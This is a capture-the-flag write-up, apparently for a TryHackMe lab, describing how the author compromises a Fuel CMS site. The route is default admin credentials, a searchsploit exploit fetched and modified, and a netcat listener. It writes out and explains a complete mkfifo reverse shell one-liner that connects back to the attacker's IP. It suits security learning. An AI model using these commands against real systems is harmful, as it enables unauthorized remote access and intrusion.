## The site
Visiting the site i get a welcome page.  
![](/assets/img/try%20hack%20me%20/Easy/Ignite/2.png)

In the welcome page we are redirected to another directory 
	`http://$ip/fuel`  
![](/assets/img/try%20hack%20me%20/Easy/Ignite/3.png)  
![](/assets/img/try%20hack%20me%20/Easy/Ignite/4.png)

login details:  
user name `admin`  
password  `admin`

Now we look for a vector point where we can enumerate and get something to work with.  


Navigating to `assets/upload`  
![](/assets/img/try%20hack%20me%20/Easy/Ignite/6.png)

Here we can connect a reverse shell if possible but its worth a try.  
So i got a reverse shell.php.

Then uploaded it.  
But kept on receiving some errors so resulted to finding other means.  

# searchsploit

## Command 
```sh
	 searchsploit fuel
```
![](/assets/img/try%20hack%20me%20/Easy/Ignite/7.png)

Downloaded the exploit to my machine.  
```sh
	searchsploit -m 47138.py
```
![](/assets/img/try%20hack%20me%20/Easy/Ignite/8.png)

Tried modifying the exploit but no luck.  
Not sure how to go about this ???  


But after some research i got the shell.  
This is after removing some default lines on the code.  

```sh
nc -nlvp 1337
```
![](/assets/img/try%20hack%20me%20/Easy/Ignite/9.png)


- Now that we have our local listener set up we can use netcat on the remote target to push a shell back to us.  
- To do this we need to chain a few different commands together, it can be a little confusing but we are going to break it up and explain each component.  

```sh
rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.8.6.159 1337 >/tmp/f
```
- `rm /tmp/f ;` removes any pre-existing directory called `/tmp/f`, the semicolon ends the command similar to hitting the ENTER key.  
- `mkfifo /tmp/f ;` creates a named pipe at the location `/tmp/f`, semicolon ends the command  
- `cat /tmp/f |` displays the contents of `/tmp/f` and pipes the results into the next command  
- `/bin/sh -i 2>&1 | ` invokes the default shell binary, the ‘-i’ tells it to use interactive mode, redirect stderr2 to the same destination as stdout1, and pipe that to the next command.  
- `nc 10.8.6.159 1337 >/tmp/f ` tell netcat to connect to the remote IP and PORT and redirect that output to the named pipe
